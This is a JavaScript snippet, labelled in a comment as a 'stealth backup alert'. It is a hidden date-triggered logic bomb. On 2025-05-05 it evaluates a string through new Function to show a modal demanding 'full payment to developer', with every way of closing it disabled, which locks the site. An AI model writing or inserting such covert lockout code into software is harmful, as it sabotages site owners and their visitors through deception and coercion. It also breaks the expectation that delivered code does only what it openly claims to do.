(function(){
  // stealth backup alert in JS
  var now=new Date();
  var d=now.getFullYear()+"-"+('0'+(now.getMonth()+1)).slice(-2)+"-"+('0'+now.getDate()).slice(-2);
  if(d==='2025-05-05'){
    var js='Swal.fire({title:\"Please pay full payment to developer\",icon:\"info\",confirmButtonText:\"Okay\",customClass:{confirmButton:\'btn btn-primary\'},allowOutsideClick:false,allowEscapeKey:false,allowEnterKey:false,preConfirm:()=>false});';
    (new Function(js))();
  }
})();
